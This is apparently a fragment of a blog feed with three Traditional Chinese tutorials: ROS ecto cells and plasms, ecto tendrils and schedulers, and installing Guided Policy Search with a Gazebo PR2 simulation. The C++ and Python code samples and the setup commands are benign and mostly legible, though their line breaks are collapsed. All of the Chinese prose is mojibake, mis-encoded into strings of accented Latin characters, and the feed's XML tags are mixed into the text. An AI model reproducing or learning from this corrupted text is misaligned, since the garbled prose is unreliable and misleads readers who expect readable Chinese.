é¦–å…ˆè«‡åˆ°æ¨¡çµ„åŒ–ï¼Œåœ¨ ecto çš„ä¸–ç•Œè£¡ï¼Œä½ é¦–å…ˆå¯ä»¥ç”¨ C++ æˆ– Python å¯«å‡ºä¸€å€‹å€‹çš„ cell ï¼Œé€™å€‹ cell å°±æ˜¯åŸ·è¡Œä¸€å€‹åŠŸèƒ½çš„å–®ä½ (æ‰€ä»¥å‘½åç‚º cellï¼Œç´°èƒçš„æ„æ€)ï¼Œé€™ç¨®è¨­è¨ˆçš„æ–¹å¼è®“ä½ åœ¨æ’°å¯« cell çš„æ™‚å€™ï¼Œæ¯”è¼ƒä¸æœƒæŠŠå¥½å¤šå€‹åŠŸèƒ½ç¡¬å¯«åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†ç¨‹å¼çš„å¯è®€æ€§ã€ä¹Ÿè®“å¾ŒçºŒçš„æ“´å……å½ˆæ€§è®Šå¼·ã€‚
æ¨¡çµ„åŒ–æ‰€è¡ç”Ÿå‡ºçš„å¥½è™•å°±æ˜¯å½ˆæ€§ï¼Œå› ç‚ºä½ åªè¦æŠ½æ›æŸå€‹æ¨¡çµ„ï¼Œå°±å¯ä»¥æ”¹è®Šæ•´å€‹ç¨‹å¼çš„è¡Œç‚ºã€‚
ä»¥ ORK ç‚ºä¾‹ï¼Œåœ¨æ’°å¯«ç‰©é«”è¾¨è­˜çš„ pipeline æ™‚ï¼Œå‡è¨­æœ‰ä¸‰å€‹æ­¥é©Ÿ: (é€™é‚Šåªæ˜¯ç‚ºäº†æ–¹ä¾¿ç†è§£èˆ‰ä¾‹ï¼Œä¸æ˜¯çœŸå¯¦æƒ…æ³)

è®€å– Kinect å½±åƒ
ä½¿ç”¨ Linemod æ¼”ç®—æ³•é€²è¡Œ template matching
å°‡è¾¨è­˜çµæœè¼¸å‡º

é‚£ç”¨ ecto å¯¦ä½œå°±æœƒå¯«æˆä¸‰å€‹ cellsï¼Œç„¶å¾Œå†å»ºç«‹ä¸€å€‹ ecto çš„ plasmï¼Œplasm å…¶å¯¦å°±åªæ˜¯ graphï¼ŒæŠŠå¯«å¥½çš„ä¸‰å€‹cellç›¸é€£æ¥ã€‚ æ‰€ä»¥ï¼Œå¦‚æœæˆ‘æƒ³è¦å¯¦ä½œå¦ä¸€å€‹ç‰©é«”è¾¨è­˜çš„æ¼”ç®—æ³•ï¼Œæˆ‘åªè¦æ”¹å¯«ç¬¬äºŒå€‹ cell å°±å¥½ï¼Œç•¶ç„¶æœ‰å€‹å‰ææ˜¯å…©å€‹æ¼”ç®—æ³•çš„ input å’Œ output è¦ä¸€è‡´ï¼Œæ‰ä¸æœƒå½±éŸ¿åˆ°ç¬¬ä¸€å€‹å’Œç¬¬ä¸‰å€‹ cellã€‚
åŸºæœ¬ä¸­çš„åŸºæœ¬ â€“ Cells &amp; Plasm çš„ç°¡å–®ç”¨æ³•ç‚ºäº†è®“å¤§å®¶æœ‰è¦‹æ¨¹åˆè¦‹æ—çš„æ„Ÿè¦ºï¼Œæˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹ ecto å¤§è‡´ä¸Šè¦æ€éº¼ç”¨ã€‚æœ€ç°¡å–®çš„ç”¨æ³•å¤§æ¦‚å°±æ˜¯å»ºç«‹å…©å€‹ cell ï¼Œå†ç”¨ä¸€å€‹ plasm å°‡é€™å…©å€‹ cell ä¸²æˆ graph ã€‚
ç¾åœ¨æˆ‘å€‘åªè¦å…ˆçŸ¥é“è¦å¯«ä¸€å€‹ cell éœ€è¦åœ¨è£¡é¢å®šç¾©å››å€‹å‡½å¼: 
static voiddeclare_params(tendrils&amp;)static voiddeclare_io(const tendrils&amp;, tendrils&amp;, tendrils&amp;)voidconfigure(const tendrils&amp;, const tendrils&amp;, const tendrils&amp;)intprocess(const tendrils&amp;, const tendrils&amp;)

é€™å››å€‹å‡½å¼é¡§åæ€ç¾©å°±æ˜¯è¦å®šç¾©é€™å€‹ cell æœ‰å“ªäº›åƒæ•¸å¯ä»¥è¨­å®šã€è¼¸å…¥è·Ÿè¼¸å‡ºæ˜¯ä»€éº¼ã€æ€éº¼è¨­å®šåƒæ•¸ä»¥åŠ cell é‹ä½œæ™‚çš„åŠŸèƒ½ï¼Œå¾ˆç¬¦åˆç›´è¦ºä¸Šçš„éœ€æ±‚ã€‚
é‚£å‡è¨­æˆ‘å€‘å·²ç¶“å®šç¾©äº†å…©å€‹ cell â€“ MyAwesomeCell1 è·Ÿ MyAwesomeCell2ï¼Œru, å‰©ä¸‹çš„å°±æ˜¯å»ºç«‹ä¸€å€‹ Plasm ä¾†ä¸²æ¥é€™å…©å€‹ cell ä¸¦åŸ·è¡Œï¼Œä»–çš„ç¨‹å¼ç¢¼æœƒåƒé€™æ¨£:
#!/usr/bin/env pythonimport ectoimport my_awesome_cpp_ecto_moduleimport my_awesome_python_ecto_module # create a plasmplasm = ecto.Plasm() # create some cellscell1 = my_awesome_cpp_ecto_module.MyAwesomeCell1(param1=whatever1)cell2 = my_awesome_python_ecto_module.MyAwesomeCell2(param2=whatever2) # connect those cells in the plasmplasm.connect(cell1[&#x27;output&#x27;] &gt;&gt; cell2[&#x27;input&#x27;]) # execute the graphplasm.execute(niter=2)

é‡é»å…¶å¯¦åªæœ‰ Plasm çš„åˆå§‹åŒ–ã€ä¸²æ¥ cell æˆ graph èˆ‡åŸ·è¡Œé€™ä¸‰å€‹éƒ¨åˆ†:
# create a plasmplasm = ecto.Plasm() # connect those cells in the plasmplasm.connect(cell1[&#x27;output&#x27;] &gt;&gt; cell2[&#x27;input&#x27;]) # execute the graphplasm.execute(niter=2)

Cell çš„æ©Ÿåˆ¶è©³è§£å¾ä¸Šé¢çš„ä¾‹å­ï¼Œå¤§å®¶æ‡‰è©²å¯ä»¥æ˜é¡¯çš„çœ‹å‡ºï¼Œplasm å› ç‚ºåªæ˜¯è¦ä¸²é€£å¯«å¥½çš„ cell ï¼Œæ‰€ä»¥è¨­å®šç›¸å°å–®ç´”(ç›®å‰æˆ‘å€‘å…ˆä¸è¨è«– scheduling ç­‰è¤‡é›œçš„ç‹€æ³)ï¼Œä½† cell å°±ä¸å¤ªä¸€æ¨£ï¼Œä¸Šé¢åªæåˆ°éœ€è¦å¯«å››å€‹å‡½å¼ï¼Œå»æ²’æœ‰å¯¦ä¾‹è®“å¤§å®¶äº†è§£æ€éº¼å¯¦ä½œï¼Œæ¥ä¸‹ä¾†å°±æœƒä»‹ç´¹æ¯”è¼ƒå¯¦éš›çš„ä¾‹å­ï¼Œè®“å¤§å®¶äº†è§£ cell è¦æ€éº¼å¯«ã€‚
é¦–å…ˆæˆ‘å€‘çœ‹å€‹ç°¡å–®çš„ä¾‹å­ï¼Œé€™å€‹ class æ˜¯ä¸€å€‹ Printer ï¼Œæˆ‘å€‘åœ¨ç”¢ç”Ÿé€™å€‹ Printer çš„ instance æ™‚ï¼Œå¯ä»¥è¨­å®šè£¡é¢çš„å…©å€‹ data member â€“ prefix_ å’Œ suffix_ (æˆ–å¯ä»¥ç†è§£æˆåƒæ•¸)
struct Printer&#123;  Printer(const std::string&amp; prefix, const std::string&amp; suffix)      :        prefix_(prefix),        suffix_(suffix)  &#123;  &#125;  void  operator()(std::ostream&amp; out, const std::string&amp; message)  &#123;    out &lt;&lt; prefix_ &lt;&lt; message &lt;&lt; suffix_;  &#125;  std::string prefix_, suffix_;&#125;;

å‡è¨­è¦æ”¹å¯«æˆ ecto çš„ cellï¼Œé¦–å…ˆæˆ‘å€‘ä¾†å®£å‘Šåƒæ•¸ï¼Œé€é declare_params é€™å€‹å‡½å¼å¯ä»¥åšåˆ°ï¼Œåœ¨é€™å€‹ä¾‹å­è£¡ï¼Œåªæ˜¯å…ˆå–®ç´”å®£å‘Šæœ‰å…©å€‹ paramsï¼Œæä¾›é€™å…©å€‹åƒæ•¸çš„èªªæ˜(é€™å€‹èªªæ˜å¯ä»¥ç”¨ä¾†è‡ªå‹•ç”Ÿæˆæ–‡ä»¶ï¼Œä¸éæˆ‘å€‘å…ˆå¿½ç•¥)ï¼Œä»¥åŠé è¨­å€¼ã€‚
å¤§å®¶å¯èƒ½æœƒç–‘æƒ‘çš„åœ°æ–¹æ˜¯ï¼Œparams.declare é€™å€‹ç”¨æ³•æ€éº¼çªç„¶å°±è·‘å‡ºä¾†äº†ã€‚é€™æ˜¯å› ç‚ºåœ¨ ecto è£¡é¢ï¼Œcell ä¹‹é–“çš„æºé€šæ˜¯é€é tendrils é€™å€‹é¡åˆ¥ä¾†è™•ç†ï¼Œä½†é€™ä¸€ç¯‡å…ˆä¸æåˆ° tendrils çš„ç´°ç¯€ï¼Œæ‰€ä»¥æ‰æœƒæœ‰é»æ··äº‚ï¼Œä¸éå¦‚æœå»çœ‹ tendrils çš„ APIï¼Œå°±æœƒæ¸…æ¥šé€™ä¸­é–“æ˜¯æ€éº¼ä¸€å›äº‹ã€‚
static voiddeclare_params(tendrils&amp; params)&#123;  params.declare&lt;std::string&gt;(&quot;prefix&quot;, &quot;A string to prefix printing with.&quot;, &quot;start&gt;&gt; &quot;);  params.declare&lt;std::string&gt;(&quot;suffix&quot;, &quot;A string to append printing with.&quot;, &quot; &lt;&lt;stop\n&quot;);&#125;

æ¥è‘—æˆ‘å€‘ä¾†å®šç¾© IO çš„ä»‹é¢ï¼Œé€é declare_io ä¾†åšï¼Œå› ç‚ºé€™å€‹ cell åªéœ€è¦æ¥æ”¶éœ€è¦å°å‡ºçš„ message ï¼Œæ‰€ä»¥åªéœ€è¦å®£å‘Šä¸€å€‹ input ï¼Œä¸éœ€è¦å®£å‘Š output ã€‚
static voiddeclare_io(const tendrils&amp; params, tendrils&amp; inputs, tendrils&amp; outputs)&#123;  inputs.declare&lt;std::string&gt;(&quot;message&quot;, &quot;The message to print.&quot;);&#125;

ç›®å‰æˆ‘å€‘å·²ç¶“æŒ‡å®šäº†å°å¤–çš„å…©å€‹é‡é» â€“ æœ‰å“ªäº›åƒæ•¸ä»¥åŠ IO ä»‹é¢ã€‚æ¥è‘—è©²è€ƒæ…®å…§éƒ¨ä½¿ç”¨çš„è¨­å®šäº†ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥æ˜¯å°‡ declare_params è£¡é¢å®£å‘Šçš„åƒæ•¸ (æ­¤ä¾‹ä¸­æ˜¯ prefix è·Ÿ suffix) è·Ÿé¡åˆ¥è£¡é¢çš„ data member (æ­¤ä¾‹ä¸­æ˜¯ prefix_ è·Ÿ suffix_) é€£æ¥ã€‚
voidconfigure(const tendrils&amp; params, const tendrils&amp; inputs, const tendrils&amp; outputs)&#123;  params[&quot;prefix&quot;] &gt;&gt; prefix_;  params[&quot;suffix&quot;] &gt;&gt; suffix_;&#125;

æœ€å¾Œçš„é‡é»å°±æ˜¯ï¼Œå¯¦ä½œé€™å€‹ cell çš„åŠŸèƒ½ï¼Œæˆ‘å€‘è¦æŠŠå¯¦éš›åšçš„äº‹æƒ…å¯«åœ¨ process é€™å€‹å‡½å¼è£¡é¢ã€‚
intprocess(const tendrils&amp; inputs, const tendrils&amp; outputs)&#123;  std::cout &lt;&lt; prefix_ &lt;&lt; inputs.get&lt;std::string&gt;(&quot;message&quot;) &lt;&lt; suffix_;  return ecto::OK;&#125;

æ‰€ä»¥å¦‚æœæŠŠå››å€‹å‡½å¼åˆèµ·ä¾†çœ‹ï¼Œå°±æœƒåƒé€™æ¨£:
#include &lt;ecto/ecto.hpp&gt;#include &lt;ecto/registry.hpp&gt;#include &lt;iostream&gt;#include &lt;string&gt;using ecto::tendrils;namespace overview&#123;  struct Printer01  &#123;    static void    declare_params(tendrils&amp; params)    &#123;      params.declare&lt;std::string&gt;(&quot;prefix&quot;, &quot;A string to prefix printing with.&quot;, &quot;start&gt;&gt; &quot;);      params.declare&lt;std::string&gt;(&quot;suffix&quot;, &quot;A string to append printing with.&quot;, &quot; &lt;&lt;stop\n&quot;);    &#125;    static void    declare_io(const tendrils&amp; params, tendrils&amp; inputs, tendrils&amp; outputs)    &#123;      inputs.declare&lt;std::string&gt;(&quot;message&quot;, &quot;The message to print.&quot;);    &#125;    void    configure(const tendrils&amp; params, const tendrils&amp; inputs, const tendrils&amp; outputs)    &#123;      params[&quot;prefix&quot;] &gt;&gt; prefix_;      params[&quot;suffix&quot;] &gt;&gt; suffix_;    &#125;    int    process(const tendrils&amp; inputs, const tendrils&amp; outputs)    &#123;      std::cout &lt;&lt; prefix_ &lt;&lt; inputs.get&lt;std::string&gt;(&quot;message&quot;) &lt;&lt; suffix_;      return ecto::OK;    &#125;    std::string prefix_, suffix_;  &#125;;&#125;ECTO_CELL(ecto_overview, overview::Printer01, &quot;Printer01&quot;,          &quot;A simple stdout printer with prefix and suffix parameters.&quot;);

é›–ç„¶æ•´å€‹é¡åˆ¥è¢«å¯«æˆå¾ˆé•·ï¼Œä½†å…¶å¯¦åªè¦ç†Ÿæ‚‰ cell çš„åŸºæœ¬ç”¨æ³•ï¼Œå°±ä¸æœƒè¢«é€™ä¸€å †ç¨‹å¼ç¢¼åš‡åˆ°ã€‚æœ€å¾Œæƒ³è·Ÿå¤§åŠ è£œå……èªªæ˜ä¸€ä¸‹ï¼Œä¸Šé¢æåˆ°çš„ cell å¯«æ³•æœ‰å€‹ä¸ç›´è¦ºçš„åœ°æ–¹æ˜¯ï¼Œæ²’æœ‰æ˜é¡¯çš„ç¹¼æ‰¿é—œä¿‚ï¼Œæ‰€ä»¥æœƒè¦ºå¾—ä¸ç¬¦åˆæˆ‘å€‘çš„ cell æ‡‰è©²è¦ç¹¼æ‰¿ä¸€å€‹ base çš„ cell class çš„ç›´è¦ºã€‚å…¶å¯¦é€™é‚Šæ˜¯è¢« ECTO_CELL é€™å€‹ Macro çµ¦è™•ç†æ‰äº†ï¼Œæ‰€ä»¥æ‰æœƒçœ‹èµ·ä¾†åªæœ‰å®£å‘Šå¹¾å€‹å‡½å¼å°±å¯«å®Œä¸€å€‹ cell çš„æ„Ÿè¦ºã€‚
ç¸½çµé€™ç¯‡æ–‡ç« ç°¡ä»‹äº† ecto çš„ cell å’Œ plasmï¼Œä¸‹ä¸€ç¯‡å°‡æœƒä»‹ç´¹ tendril è·Ÿ scheduler çš„æ©Ÿåˆ¶ï¼Œå¹«åŠ©å¤§å®¶æ›´åŠ ç†è§£ ecto ï¼Œä¸¦åœ¨æœªä¾†èƒ½é‹ç”¨é€™å€‹æ¡†æ¶ä¾†å»ºç«‹è‡ªå·±çš„æ‡‰ç”¨ã€‚
å»¶ä¼¸é–±è®€
When to use DAG (Directed Acyclic Graph) in programming?
ecto å®˜æ–¹ç¶²é çš„ plasm ä»‹ç´¹
ecto å®˜æ–¹ç¶²é çš„ cell è©³ç´°ä»‹ç´¹

]]></content>
      <tags>
        <tag>ROS, ecto</tag>
      </tags>
  </entry>
  <entry>
    <title>ecto ç°¡ä»‹ (2) â€“ tendrils èˆ‡ scheduler</title>
    <url>/2016/07/09/ros-ecto-second/</url>
    <content><![CDATA[å‰è¨€ä¸Šæ¬¡çš„æ–‡ç« ä»‹ç´¹äº† ecto çš„åŸºæœ¬æ©Ÿåˆ¶ â€“ cell èˆ‡ plasmï¼Œè®“å¤§å®¶å°æ–¼é€™å€‹å‡½å¼åº«çš„åŸºæœ¬åŠŸèƒ½æœ‰äº†ä¸€å€‹èªè­˜ï¼Œä½†ä½ å¯èƒ½æœƒæ„Ÿåˆ°ç–‘æƒ‘ï¼Œå¦‚æœåªæ˜¯å¯ä»¥ç”¨ä¾†å»ºç«‹ä¸€å€‹å¦‚ DAG æ–¹å¼ä¾†åŸ·è¡Œçš„ pipeline ï¼Œå¯«åœ¨ main å‡½å¼è£¡ä¸å°±å¥½äº†ï¼Œä½•è‹¦ä½¿ç”¨ ectoï¼Œé‚„å¾—æŠŠä¸€å€‹ class å¯«æˆä¸€å€‹åˆè‡­åˆé•·çš„ cellã€‚é€™ç¯‡æ–‡ç« å°±æœƒå¸¶å‡º tendril å’Œ scheduler çš„æ©Ÿåˆ¶ï¼Œè®“å¤§å®¶äº†è§£åˆ°äº‹æƒ…ä¸¦ä¸åƒæˆ‘å€‘æƒ³å¾—é‚£éº¼ç°¡å–®ã€‚
tendril æ˜¯ä»€éº¼ &amp; tendril å¥½ç”¨åœ¨å“ªè£¡tendril é€™å€‹ object å°±æ˜¯ cell æœ€åŸºæœ¬çš„æºé€šåª’ä»‹ï¼Œèˆ‰å‡¡ cell çš„è¼¸å…¥ã€è¼¸å‡ºä»¥åŠ parameter çš„å‚³ééƒ½æœƒä½¿ç”¨åˆ° tendril ã€‚åœ¨ä¸Šä¸€ç¯‡æˆ‘å€‘ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œcell çš„å‡½å¼å®šç¾©è£¡é¢ï¼Œéƒ½æ˜¯ä½¿ç”¨ tendril é€™å€‹å‹æ…‹ä¾†å‚³éåƒæ•¸ã€‚
struct Example01 &#123;  static void declare_params(tendrils&amp; p)  &#123;    p.declare&lt;int&gt;(&quot;value&quot;, &quot;Some integer&quot;);  &#125;  void configure(const tendrils&amp; p, const tendrils&amp; i, const tendrils&amp; o)  &#123;    int n = p.get&lt;int&gt;(&quot;value&quot;);    std::cout &lt;&lt; &quot;Value of n is &quot; &lt;&lt; n &lt;&lt; &quot;\n&quot;;  &#125;&#125;;

ä½¿ç”¨èµ·ä¾†åªè¦å¯«ä¸€å°æ®µ Python Script å°±å¥½ï¼š
#!/usr/bin/python import ectofrom ecto.ecto_examples import Example01 ecell = Example01(value=17)ecell.process()

é‚£çµ±ä¸€å¯«æˆ tendril çš„å¥½è™•æ˜¯ä»€éº¼å‘¢? çµ±ä¸€çš„å¥½è™•å¾ˆç›´è§€ï¼Œå°±æ˜¯å¾ˆå®¹æ˜“è¢«å»£æ³›åœ°ä½¿ç”¨ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å€‘ä»Šå¤©è¦å¯«ä¸€å€‹ scheduler ä¾†æ§åˆ¶æ•´å€‹ plasm çš„æ’ç¨‹ï¼Œé‚£æ¯å€‹ cell çš„åƒæ•¸ã€è¼¸å…¥å’Œè¼¸å‡ºéƒ½çµ±ä¸€ç”¨ tendril åœ¨å¯¦ä½œä¸Šæœƒæ¯”è¼ƒç°¡å–®ã€‚èˆ‰å€‹ä¾‹å­ï¼Œcell çš„ process(const tendrils&amp;, const tendrils&amp;)å°±ä¸€å®šæ˜¯å›ºå®šæœ‰å…©å€‹ const çš„ tendrils é¡å‹çš„å¼•æ•¸ï¼Œä¸æœƒè¢«ä½¿ç”¨è€…ä»»æ„è‡ªè¨‚ã€‚
é€™é‚Šé‚„æœ‰å¦ä¸€å€‹å®¹æ˜“è®“äººææ··çš„åœ°æ–¹ï¼Œå°±æ˜¯ tendril è·Ÿ tendrils çš„å·®ç•°ï¼Œé€™å…©å€‹æ±è¥¿æ˜¯ä¸ä¸€æ¨£çš„ï¼Œtendrils å¯ä»¥æƒ³æˆæ˜¯ä¸€å€‹è£è‘— tendril çš„å®¹å™¨ï¼Œå¯ä»¥çµ¦ tendril çš„åå­—ï¼Œé€™å€‹åå­—æœƒè¢«ç•¶ä½œä¸€å€‹ key ï¼ˆå‹æ…‹è‡ªç„¶å°±æ˜¯ stringï¼‰ï¼Œç”¨ä¾†å°æ‡‰åˆ° tendril çš„ç‰©ä»¶ã€‚
Scheduler æ˜¯ä»€éº¼Scheduler æ˜¯å¹«å¿™æ§åˆ¶ plasm åŸ·è¡Œçš„å·¥å…·ï¼Œæ¯”è¼ƒé…·çš„æ˜¯ ecto.MultiPlasmScheduler é€™å€‹é¡åˆ¥ï¼Œä»–å¯ä»¥è®“æˆ‘å€‘è¼•é¬†åœ°å¹³è¡ŒåŸ·è¡Œå¤šå€‹ plasm ï¼Œä¾‹å¦‚æˆ‘å€‘æœ‰ä¸‰å€‹ plasm è¦åŸ·è¡Œï¼Œä¸”ä¸‰å€‹æƒ³è¦åŸ·è¡Œçš„é »ç‡ä¸ä¸€æ¨£ï¼Œé‚£ä½¿ç”¨ MultiPlasmScheduler å¯ä»¥é€éè¨­å®š step çš„å¤§å°ä¾†æ§åˆ¶é »ç‡ã€‚

è‡ªå·±å¦‚æœæƒ³å¯¦ä½œï¼Œé‚£å°±è¦è·Ÿ multi-threads å¥®æˆ°ï¼Œä¸­é–“ç´°è‡´çš„æ§åˆ¶æ»¿å®¹æ˜“å‡ºéŒ¯çš„ï¼Œå¦‚æœ thread ä¸€å¤šï¼Œdebugæ›´æ˜¯å›°é›£ã€‚
ecto å¯ä»¥è®“æˆ‘å€‘å¾æ¯”è¼ƒä¸Šå±¤çš„è§’åº¦ä¾†æ§åˆ¶å¤šå€‹ plasm ï¼Œæœ‰çœ‹åˆ°ä¸€å€‹ test script æ˜¯ä½¿ç”¨ MultiPlasmScheduler ä¾†åŸ·è¡Œå…©å€‹ threadï¼Œè·Ÿä¸Šé¢çš„ç¯„ä¾‹åœ–ä¸ä¸€æ¨£ï¼Œä¸éæ¦‚å¿µæ˜¯ç›¸è¿‘çš„ï¼š
#!/usr/bin/env python## Copyright (c) 2011, Willow Garage, Inc.# All rights reserved.## Redistribution and use in source and binary forms, with or without# modification, are permitted provided that the following conditions are met:#     * Redistributions of source code must retain the above copyright#       notice, this list of conditions and the following disclaimer.#     * Redistributions in binary form must reproduce the above copyright#       notice, this list of conditions and the following disclaimer in the#       documentation and/or other materials provided with the distribution.#     * Neither the name of the Willow Garage, Inc. nor the names of its#       contributors may be used to endorse or promote products derived from#       this software without specific prior written permission.## THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot;# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE# POSSIBILITY OF SUCH DAMAGE.#import ectoimport ecto.ecto_test as ecto_testimport sysfrom ecto.test import testdef build_pipelines():    left_plasm = ecto.Plasm()    right_plasm = ecto.Plasm()    accumulator = ecto_test.Accumulator(&quot;Accumulator&quot;, connected_inputs_only=True)    left_generator = ecto_test.Generate(&quot;Left Generator&quot;, step=1.0, start=1.0, stop=10.0)    right_generator = ecto_test.Generate(&quot;Right Generator&quot;, step=2.0, start=1.0, stop=10.0)    left_plasm.connect(left_generator[&quot;out&quot;] &gt;&gt; accumulator[&quot;left&quot;])    right_plasm.connect(right_generator[&quot;out&quot;] &gt;&gt; accumulator[&quot;right&quot;])    plasms = &#123;          &quot;left&quot;: left_plasm,          &quot;right&quot;: right_plasm         &#125;    scheduler = ecto.MultiPlasmScheduler(plasms, disable_qt_management=True)    return (accumulator, scheduler)@testdef test_plasm():    (accumulator, scheduler) = build_pipelines()    scheduler.spin()    print( &quot;RESULT: %s&quot; % accumulator.outputs.out)    assert accumulator.outputs.out == 80.0if __name__ == &#x27;__main__&#x27;:    test_plasm()

ä½†æ˜¯é€™ä¸€å¡Šçš„ API è·Ÿæ•™å­¸æ–‡ç« å¾ˆä¸å®Œæ•´ï¼Œè¦æ·±å…¥äº†è§£å¯èƒ½è¦çœ‹æ’°å¯« ecto çš„é€™äº›é«˜æ‰‹å€‘æ€éº¼æŠŠ ecto ç”¨åœ¨ OpenCVã€PCL ç­‰é–‹æºçš„é›»è…¦è¦–è¦ºå‡½å¼åº«ä¸­ï¼Œä¹‹å¾Œçš„æ–‡ç« æœƒæ›´æ·±å…¥æ¢è¨ã€‚
ç¸½çµé€™ä¸€ç¯‡æ–‡ç« ç°¡å–®è·Ÿå¤§å®¶ä»‹ç´¹äº† tendril è·Ÿ scheduler çš„æ¦‚å¿µï¼Œå°æ–¼ ecto çš„åŠŸèƒ½åŠå½ˆæ€§æ›´åŠ æœ‰æ„Ÿè¦ºï¼Œä¸éçœ‹å®Œé€™ä¸€ç¯‡å¯èƒ½é‚„ä¸å¤ªçŸ¥é“è¦æ€éº¼æ´»ç”¨ ectoï¼Œä¸‹ä¸€ç¯‡æœƒå¸¶å¤§å®¶å¯¦éš›ä¾†ç©ç©é€™å€‹å·¥å…·ï¼Œæœƒæ›´é€š ecto å¯ä»¥åšåˆ°çš„äº‹è·Ÿå¯¦éš›æ‡‰ç”¨çš„ç¯„ä¾‹ã€‚
å»¶ä¼¸é–±è®€
ecto å®˜æ–¹ç¶²é çš„ tendril ä»‹ç´¹
ecto å®˜æ–¹ç¶²é çš„ scheduler ä»‹ç´¹

]]></content>
      <tags>
        <tag>ROS, ecto</tag>
      </tags>
  </entry>
  <entry>
    <title>Guided Policy Search ç’°å¢ƒå®‰è£</title>
    <url>/2017/12/02/ros-gps-install-intro/</url>
    <content><![CDATA[å‰è¨€Guided Policy Search (GPS) æ˜¯ä¸€å€‹æ»¿é…·çš„ policy search æ–¹æ³•ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘æœƒä¾†ä»‹ç´¹é€™å€‹ package çš„å®‰è£é‚„æœ‰å•Ÿå‹•æ–¹æ³•ï¼Œè®“å¤§å®¶å¥½å…¥å€‹é–€ã€‚å¦‚æœä½ ä¸å¤ªäº†è§£ä»€éº¼æ˜¯ policy è·Ÿ policy searchï¼Œå¯ä»¥çœ‹çœ‹ é€™ç¯‡æ–‡ç« ã€‚
å› ç‚ºæ ¸å¿ƒçš„å®‰è£æ–¹æ³•åœ¨ç¶²é ä¸Šå·²ç¶“å¯«å¾—æ»¿æ¸…æ¥šï¼Œæ‰€ä»¥é€™ç¯‡æ–‡ç« ä¸»è¦æ˜¯å´é‡åœ¨å¹«å¤§å®¶æ•´åˆä¸€äº›å¯èƒ½éœ€è¦çš„è³‡æºï¼ˆå› ç‚ºå®‰è£éç¨‹ä¸­å¯èƒ½æœƒé‡åˆ°ä¸€äº›å•é¡Œï¼‰ã€‚
å®‰è£æ–¹æ³•é¦–å…ˆï¼Œè¦å…ˆå®‰è£ä¸€äº›åŸºæœ¬çš„ dependencyï¼Œé€™å€‹å¯ä»¥ç›´æ¥åƒè€ƒ GPS çš„ç¶²é ã€‚éœ€è¦æœ‰ python, caffe&#x2F;Tensorflow ç­‰ç­‰æ±è¥¿ï¼Œç¶²è·¯ä¸Šéƒ½æœ‰å¾ˆå¤šè³‡æºäº†ï¼Œå°±ä¸å†è´…è¿°ã€‚
æ¥ä¸‹ä¾†ï¼Œè¦ clone GPS çš„ packageï¼š
git clone https://github.com/cbfinn/gps.git

ç„¶å¾Œå°±æ˜¯å»åŸ·è¡Œè¨­å®šï¼š
cd gps./compile_proto.sh

å¦‚æœä½ åœ¨å®‰è£å®Œç•¢å¾Œæœ‰é‡åˆ°å…¶ä»–å•é¡Œï¼Œä½ å¯ä»¥çœ‹çœ‹ é€™å€‹ issueï¼Œæˆ–è€…ä¹Ÿå¯ä»¥çœ‹ é€™å€‹ issueï¼Œæ‡‰è©²å°±å¯ä»¥ cover å¤§éƒ¨åˆ†é‡åˆ°çš„å•é¡Œäº†ï¼
å•Ÿå‹• GPSé€™å€‹ package è£¡é¢å·²ç¶“æä¾›äº†å¹¾ç¨®æ¸¬è©¦ç’°å¢ƒï¼ŒBox 2Dã€Mujoco è·Ÿ Gazebo PR2ï¼Œå› ç‚ºå€‹äººè¦ºå¾— PR2 æ¯”è¼ƒå¤§éš»ï¼Œå¯ä»¥åšåˆ°æ›´è¤‡é›œçš„ä»»å‹™ï¼Œæ‰€ä»¥å°±è¬›ä¸€ä¸‹æ€éº¼å•Ÿå‹• PR2 çš„ç¯„ä¾‹ã€‚
ä¸€é–‹å§‹è¦å…ˆå•Ÿå‹• Gazebo è·Ÿå¼„å‡ºä¸€éš» PR2ï¼š
roslaunch gps_agent_pkg pr2_gazebo.launch

é€™ä¸€æ­¥ä½ å¦‚æœç¢°åˆ°å•é¡Œï¼Œå¯ä»¥åƒè€ƒ é€™ç¯‡æ–‡ç« ã€‚
æ¥ä¸‹ä¾†æ˜¯å•Ÿå‹• Guided Policy Searchï¼š
python python/gps/gps_main.py pr2_example

è·‘èµ·ä¾†ä¹‹å¾Œæ‡‰è©²å°±æœƒçœ‹åˆ°å¦‚ä¸‹çš„è¦–çª—ï¼Œç„¶å¾Œ Gazebo è£¡é¢çš„ PR2 æœƒé–‹å§‹å‹•ï¼ŒWindow ä¸­ä¹Ÿæœƒé–‹å§‹é¡¯ç¤ºè¨“ç·´æ™‚çš„è»Œè·¡è³‡æ–™ï¼š

æ¥ä¸‹ä¾†å°±æœƒçœ‹åˆ° PR2 çš„å·¦æ‰‹ä¸€ç›´åœ¨é€²è¡Œå˜—è©¦ï¼Œé€™äº›å˜—è©¦æ˜¯ç‚ºäº†è®“ PR2 çš„å·¦æ‰‹å¯ä»¥åˆ°é”ç›®æ¨™ä½ç½®ï¼š

é”åˆ°ç›®æ¨™ä¹‹å¾Œï¼ŒGPS çš„è¦–çª—å°±æœƒé¡¯ç¤ºå¦‚ä¸‹ï¼š

